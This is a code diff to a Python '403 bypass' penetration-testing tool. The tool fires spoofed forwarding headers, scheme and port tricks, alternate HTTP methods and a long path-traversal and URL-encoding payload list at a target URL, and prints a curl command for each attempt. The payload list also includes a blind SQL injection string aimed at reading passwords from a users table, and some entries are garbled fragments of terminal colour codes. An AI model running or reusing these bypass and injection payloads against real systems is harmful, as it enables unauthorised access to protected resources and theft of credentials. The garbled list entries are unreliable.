@@ -1,4 +1,5 @@
 import argparse
+import json
 import socket
 import sys
 import time
@@ -37,10 +38,10 @@ def usage():
 
 def Header_Bypass(domain, target,ip_list):
     term_width = shutil.get_terminal_size((80, 20)).columns
-    user_agent = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
-                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
-    }
+    # user_agent = {
+    #     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
+    #                   "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+    # }
 
     print(f"{Fore.BLUE}{'-' * 22}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}[+] HTTP Header Bypass{Style.RESET_ALL}")
@@ -96,43 +97,49 @@ def Header_Bypass(domain, target,ip_list):
     for header_name in header_payloads:
         for ip in ip_list:
             print(f"{header_name} Payload:", end=' ')
-            headers = user_agent.copy()
+            headers = headers_global.copy()
             value = f"{header_name}: {ip}"
             headers[header_name] = value
 
             try:
                 response = requests.get(target, headers=headers, verify=False)
                 print(f"Status: {response.status_code}, Length: {len(response.content)}")
-                print(f"{'╭' + '─' * (term_width - 2)}╮")
-                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
-                    f"{Fore.GREEN}curl -ks -H '{header_name}: {value}' -X GET '{target}' "
-                    f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
-                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+                if response.status_code not in ignore_code:
+                    print(f"{'╭' + '─' * (term_width - 2)}╮")
+                    print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
+                        f"{Fore.GREEN}curl -ks -H '{header_name}: {value}' -X GET '{target}' "
+                        f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
+                    print(f"{'╰' + '─' * (term_width - 2)}╯\n")
             except requests.RequestException as e:
                 print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+            
+            time.sleep(delay)
 
         for header_name, value in special_headers:
             print(f"{header_name} Payload:", end=' ')
-            headers = user_agent.copy()
+            headers = headers_global.copy()
             headers[header_name] = value
 
             try:
                 response = requests.get(target, headers=headers, verify=False)
                 print(f"Status: {response.status_code}, Length: {len(response.content)}")
-                print(f"{'╭' + '─' * (term_width - 2)}╮")
-                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
-                    f"{Fore.GREEN}curl -ks -H '{header_name}: {value}' -X GET '{target}' "
-                    f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
-                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+                if response.status_code not in ignore_code:
+                    print(f"{'╭' + '─' * (term_width - 2)}╮")
+                    print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
+                        f"{Fore.GREEN}curl -ks -H '{header_name}: {value}' -X GET '{target}' "
+                        f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
+                    print(f"{'╰' + '─' * (term_width - 2)}╯\n")
             except requests.RequestException as e:
                 print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+            time.sleep(delay)
+
 
 def Protocol_Bypass(domain, path, target):
     schemes = ["http", "https"]
-    user_agent = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
-                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
-    }
+    # user_agent = {
+    #     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
+    #                   "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+    # }
     term_width = shutil.get_terminal_size((80, 20)).columns
 
     print(f"{Fore.BLUE}{'-' * 25}{Style.RESET_ALL}")
@@ -144,37 +151,42 @@ def Protocol_Bypass(domain, path, target):
         url = f"{scheme}://{domain}/{path}"
         print(f"{scheme.upper()} Scheme Payload:", end=' ')
         try:
-            response = requests.get(url, headers=user_agent, verify=False, allow_redirects=True)
+            response = requests.get(url, headers=headers_global, verify=False, allow_redirects=True)
             print(f"Status: {response.status_code}, Length: {len(response.content)}")
-            print(f"{'╭' + '─' * (term_width - 2)}╮")
-            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
-                  f"{Fore.GREEN}curl -ks -X GET '{url}' -H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
-            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+            if response.status_code not in ignore_code:
+                print(f"{'╭' + '─' * (term_width - 2)}╮")
+                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
+                    f"{Fore.GREEN}curl -ks -X GET '{url}' -H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
+                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
         except requests.RequestException as e:
             print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+        time.sleep(delay)
 
     # X-Forwarded-Scheme header-based
     for scheme in schemes:
-        headers = user_agent.copy()
+        headers = headers_global.copy()
         headers["X-Forwarded-Scheme"] = scheme
         print(f"X-Forwarded-Scheme {scheme.upper()} Payload:", end=' ')
         try:
             response = requests.get(target, headers=headers, verify=False, allow_redirects=True)
             print(f"Status: {response.status_code}, Length: {len(response.content)}")
-            print(f"{'╭' + '─' * (term_width - 2)}╮")
-            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
-                  f"{Fore.GREEN}curl -ks -H 'X-Forwarded-Scheme: {scheme}' -X GET '{target}' "
-                  f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
-            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+            # Print equivalent cURL payload
+            if response.status_code not in ignore_code:
+                print(f"{'╭' + '─' * (term_width - 2)}╮")
+                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
+                    f"{Fore.GREEN}curl -ks -H 'X-Forwarded-Scheme: {scheme}' -X GET '{target}' "
+                    f"-H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
+                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
         except requests.RequestException as e:
             print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+        time.sleep(delay)
 
 def Port_Bypass(target):
     ports = [443, 4443, 80, 8080, 8443]
-    user_agent = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
-                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
-    }
+    # user_agent = {
+    #     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
+    #                   "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+    # }
 
     term_width = shutil.get_terminal_size((80, 20)).columns
 
@@ -183,7 +195,7 @@ def Port_Bypass(target):
     print(f"{Fore.BLUE}{'-' * 25}{Style.RESET_ALL}")
 
     for port in ports:
-        headers = user_agent.copy()
+        headers = headers_global.copy()
         headers["X-Forwarded-Port"] = str(port)
 
         print(f"X-Forwarded-Port {port} Payload:", end=' ')
@@ -192,19 +204,21 @@ def Port_Bypass(target):
             print(f"Status: {response.status_code}, Length: {len(response.content)}")
 
             # cURL payload box
-            print(f"{'╭' + '─' * (term_width - 2)}╮")
-            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
-                  f"{Fore.GREEN}curl -ks -H 'X-Forwarded-Port: {port}' -X GET '{target}' -H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
-            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+            if response.status_code not in ignore_code:
+                print(f"{'╭' + '─' * (term_width - 2)}╮")
+                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : "
+                    f"{Fore.GREEN}curl -ks -H 'X-Forwarded-Port: {port}' -X GET '{target}' -H 'User-Agent: Mozilla/5.0'{Style.RESET_ALL}")
+                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
         except requests.RequestException as e:
             print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+        time.sleep(delay)
 
 def HTTP_Method_Bypass(target):
 
-    user_agent = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
-                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
-    }
+    # user_agent = {
+    #     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
+    #                   "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+    # }
 
     methods = [
         "GET", "POST", "HEAD", "OPTIONS", "PUT", "TRACE",
@@ -224,24 +238,27 @@ def HTTP_Method_Bypass(target):
             response = requests.request(
                 method,
                 target,
-                headers=user_agent,
+                headers=headers_global,
                 allow_redirects=True,
                 verify=False
             )
             print(f"Status: {response.status_code}, Length: {len(response.content)}")
 
             # Print equivalent cURL payload
-            print(f"{'╭' + '─' * (term_width - 2)}╮")
-            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : {Fore.GREEN}curl -ks '{target}' -L -H 'User-Agent: Mozilla/5.0' -X {method}{Style.RESET_ALL}")
-            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+            if response.status_code not in ignore_code:
+
+                print(f"{'╭' + '─' * (term_width - 2)}╮")
+                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : {Fore.GREEN}curl -ks '{target}' -L -H 'User-Agent: Mozilla/5.0' -X {method}{Style.RESET_ALL}")
+                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
 
         except requests.RequestException as e:
             print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+        time.sleep(delay)
 def URL_Encode_Bypass(target):
-    user_agent = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
-                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
-    }
+    # user_agent = {
+    #     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
+    #                   "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+    # }
     bypasses = ['m', 'm', 'm', 'm', 'm', 'm', ';5;208m', ';5;016m', ";5;038m'${black", '', '', '', '', '', '', '', '', '0', '09%3', '09.', '09', '2', '23%3', '252f%252', '252f', '2e%2', '2e%2e', '2', '2f%20%2', '2f%2', '2f%2', '2f%3b%2', '2f%3b%2f%2', '2f%3', '2f%3f', '2f', '3', '3b%0', '3b%2f%2e%2', '3b%2f%2e%2e%2f%2e%2e%2f%2', '3b%2f%2e', '3b%2f.', '3b/%2e%2e/..%2f%2', '3b/%2e', '3b/%2f%2f..', '3b/.', '3b//%2f..', '3f%2', '3f%3', '', '.%00/', '.%00;', '.%0', '.%0d/', '.%0d;', '.%5c', '.%ff/', '.%ff;', '.;%00', '.;%0d', '.;%ff', '.;', '.;\\', '.\\', '%20', '%20%2', '%252e%252e%252f', '%252e%252e%253b', '%252e%252f', '%252e%253b', '%252e', '%252', '%2e%2', '%2e%2e%3b', '%2e%2e', '%2e%2f', '%2e%3b', '%2e%3b/', '%2e', '%2e/', '%2', '%3b', '.', '..%2', '..%2f..%2', '..%2f..%2f..%2', '..', '../..', '../../..', '../../../', '../../', '../..//..', '../..;', '.././..', '../.;/..', '../', '..//..', '..//../..', '..//..;', '../;', '../;/..', '..;%2', '..;%2f..;%2', '..;%2f..;%2f..;%2', '..;/..', '..;/..;', '..;/', '..;//..', '..;//..;', '..;/;', '..;/;/..;', './', '.;', '.;/', '/.', '/../..', '/..', '/.', '/.;', '//.', '//..', '//../', '//..', '//..;', '//..;/', '/;', ';', ';/', ';', ';x', 'x/..', 'x/../', 'x/../;', 'x/..;', 'x/..;/', 'x/..;/;', 'x//..', 'x//..;', 'x/;/..', 'x/;/..;', '', '%0', '%09.', '%09..', '%09', '%2F.', '%2f%2e%2', '%2f%2e%2e%2f%2e%2e%2f%2', '%2f%2f/..', '%2f.', '%2f..%2f%2e%2e%2f%2', '%2f..%2f..%2f%2', '%2f..%2f', '%2f..%2f/..%2', '%2f..%2f/..', '%2f../%2f..%2', '%2f../%2f..', '%2f..//..%2', '%2f..//..', '%2f..//', '%2f..///', '%2f..//;', '%2f..//;/', '%2f../;/', '%2f../;/;', '%2f../;/;/', '%2f..;//', '%2f..;//;', '%2f..;/;/', '%2f/%2f..', '%2f//..%2', '%2f//..', '%2f//..;', '%2f/;/..', '%2f/;/..;', '%2f;//..', '%2f;/;/..;', '/%2e%2', '/%2e%2e%2f%2', '/%2e%2e%2f', '/%2e%2e', '/%2e', '/%2f%2f..', '/%2f/..%2', '/%2f/..', '/.%2', '/.%2e/%2e%2e/%2', '/.', '/..%2', '/..%2f%2f..', '/..%2f..%2', '/..%2f', '/..%2f/', '/..', '/../%2f', '/../..', '/../../', '/.././..', '/../.;/..', '/../', '/..//%2e%2e', '/..//%2', '/..//..', '/..//', '/../;', '/../;/..', '/..', '/.;', '//%2f..', '//.', '//../..', '///.', '///..', '///../', '', 'x', 'x', '', '', '0', '.', './%2', './.', '.%00', '.%0d', '.%5', '.', '.%ff', '2e%2e%2', '%2e', '3', '2', '2', '2', '', '', '', '?', '', '.', '//.', '/?anythin', '', '', '.randomstrin', '.;', 'htm', '20', '20${path}%20', 'jso', '..\\.', '', '/', '*', '..;', 'e/${path', '%2e', '/', '//', '..', '${path}', '', ' or 1.e(\\")=', '.e(asci', '.e(substring', ".e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='"]
     # Terminal width for fancy payload box
     term_width = shutil.get_terminal_size((80, 20)).columns
@@ -255,19 +272,22 @@ def URL_Encode_Bypass(target):
         try:
             response = requests.request(
                 target+bypass,
-                headers=user_agent,
+                headers=headers_global,
                 allow_redirects=True,
                 verify=False
             )
             print(f"Status: {response.status_code}, Length: {len(response.content)}")
 
             # Print equivalent cURL payload
-            print(f"{'╭' + '─' * (term_width - 2)}╮")
-            print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : {Fore.GREEN}curl -ks '{target}' -L -H 'User-Agent: Mozilla/5.0' -X GET {Style.RESET_ALL}")
-            print(f"{'╰' + '─' * (term_width - 2)}╯\n")
+            if response.status_code not in ignore_code:
+
+                print(f"{'╭' + '─' * (term_width - 2)}╮")
+                print(f"{Fore.CYAN} ╰─> PAYLOAD{Style.RESET_ALL} : {Fore.GREEN}curl -ks '{target}' -L -H 'User-Agent: Mozilla/5.0' -X GET {Style.RESET_ALL}")
+                print(f"{'╰' + '─' * (term_width - 2)}╯\n")
 
         except requests.RequestException as e:
             print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+        time.sleep(delay)
 
 def Exploit_403_Bypass(domain,path,target,ip_list):
     Header_Bypass(domain, target,ip_list)
@@ -287,8 +307,14 @@ def resolve_ip(domain):
     except socket.gaierror:
         return None
 
-
+delay = 0
+ignore_code = [403]
+headers_global = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 "
+                      "(KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"
+    }
 def main():
+    global delay,ignore_code,headers_global
     parser = argparse.ArgumentParser(description="Pentest bypass tool")
 
     parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://site.com/path)')
@@ -300,6 +326,9 @@ def main():
     parser.add_argument('--exploit', action='store_true', help='Run general exploit/403 bypass')
     parser.add_argument('--delay', type=float, default=0.0, help='Optional delay between requests (in seconds)')
     parser.add_argument('--tryhard', action='store_true', help='Use lots of different ip to try to bypass it')
+    parser.add_argument('--ignore_code', type=lambda s: list(map(int, s.split(','))), default=[403], help='Comma-separated list of HTTP status codes to ignore (e.g., 404,403)')
+    parser.add_argument('--headers', type=json.loads, help='Optional custom headers as a JSON string (like {max-forwards: 0} to avoid any forwarding if complex structure)')
+
 
 
     args = parser.parse_args()
@@ -323,14 +352,22 @@ def main():
     print(f"[*] Path: {path}")
     print(f"[*] IP: {ip}")
     print(f"[*] Delay: {args.delay} seconds")
+    if args.delay:
+        delay = args.delay
 
     time.sleep(args.delay)
     if args.tryhard:
         ip_list = ["${website_ip}", "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0", "localhost", "192.168.1.1"]
     else:
         ip_list = ["127.0.0.1"]
+    if args.ignore_code:
+        ignore_code = args.ignore_code
+        print(f"[*] Ignoring status codes: {ignore_code}")
+    if args.headers:
+        headers_global.update(args.headers)
     if args.header:
         Header_Bypass(domain, args.url,ip_list)
+    
     elif args.protocol:
         Protocol_Bypass(domain, path, args.url)
     elif args.port:
